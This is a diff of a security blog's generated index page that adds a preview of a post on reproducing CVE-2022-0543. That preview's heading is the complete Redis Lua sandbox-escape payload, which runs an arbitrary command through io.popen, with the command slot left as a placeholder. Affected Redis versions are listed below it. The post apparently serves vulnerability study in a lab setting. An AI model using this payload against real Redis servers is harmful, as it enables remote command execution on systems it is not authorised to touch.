@@ -150,6 +150,66 @@
             
 
 <div class="post">
+    <a href="/2023/02/08/CVE-2022-0543-Redis-Lua/">
+        <h2 class="post-title">CVE-2022-0543 Redis Lua</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CVE漏洞复现
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/8
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h5 id="eval-‘local-io-l-x3D-package-loadlib-“-x2F-usr-x2F-lib-x2F-x86-64-linux-gnu-x2F-liblua5-1-so-0”-“luaopen-io”-local-io-x3D-io-l-local-f-x3D-io-popen-“-指令-“-“r”-local-res-x3D-f-read-“-a”-f-close-return-res’-0"><a href="#eval-‘local-io-l-x3D-package-loadlib-“-x2F-usr-x2F-lib-x2F-x86-64-linux-gnu-x2F-liblua5-1-so-0”-“luaopen-io”-local-io-x3D-io-l-local-f-x3D-io-popen-“-指令-“-“r”-local-res-x3D-f-read-“-a”-f-close-return-res’-0" class="headerlink" title="eval ‘local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”); local io &#x3D; io_l(); local f &#x3D; io.popen(“     指令     “, “r”); local res &#x3D; f:read(“*a”); f:close(); return res’ 0"></a>eval ‘local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”); local io &#x3D; io_l(); local f &#x3D; io.popen(“     指令     “, “r”); local res &#x3D; f:read(“*a”); f:close(); return res’ 0</h5><p>影响范围：Debian系得linux发行版本+Ubuntu</p>
+<pre><code>2.2 &lt;= redis &lt; 5.0.13
+2.2 &lt;= redis &lt; 6.0.15
+2.2 &lt;= redis &lt; 6.2.5
+</code></pre>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CVE%E6%BC%8F%E6%B4%9E/" style="color: #ffa2c4">
+                CVE漏洞
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/redis/" style="color: #ff7d73">
+                redis
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2023/02/08/CVE-2022-0543-Redis-Lua/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/02/07/CentOS-7%E6%90%AD%E8%BD%BDvulfocus%E9%9D%B6%E5%9C%BA/">
         <h2 class="post-title">CentOS 7搭载vulfocus靶场</h2>
     </a>
@@ -190,14 +250,14 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%8C%87%E5%8D%97/" style="color: #00a596">
+            <a href="/tags/%E6%8C%87%E5%8D%97/" style="color: #ffa2c4">
                 指南
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/vulfocus/" style="color: #ffa2c4">
+            <a href="/tags/vulfocus/" style="color: #ff7d73">
                 vulfocus
             </a>
         </span>
